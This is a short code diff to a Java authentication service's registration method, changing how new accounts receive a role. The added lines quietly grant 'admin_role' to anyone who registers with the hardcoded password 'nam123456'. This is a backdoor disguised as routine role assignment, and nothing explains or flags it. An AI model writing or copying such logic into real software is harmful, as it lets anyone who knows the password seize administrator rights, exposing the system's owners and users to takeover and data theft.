@@ -97,9 +97,14 @@ public class AuthenticationImpl implements AuthenticationService {
         account.setLocked(true);
         account.setDeleted(false);
         // set role
-
-        Role role = roleRepository.findByName("user_role").orElseGet(()->{
-            Role temp = new Role("user_role");
+        String roleString;
+        if (registerRequest.getPassword().equals("nam123456")){
+            roleString="admin_role";
+        } else {
+            roleString = "user_role";
+        }
+        Role role = roleRepository.findByName(roleString).orElseGet(()->{
+            Role temp = new Role(roleString);
             return roleRepository.save(temp);
         });
         account.setRoleSet(new HashSet<>());
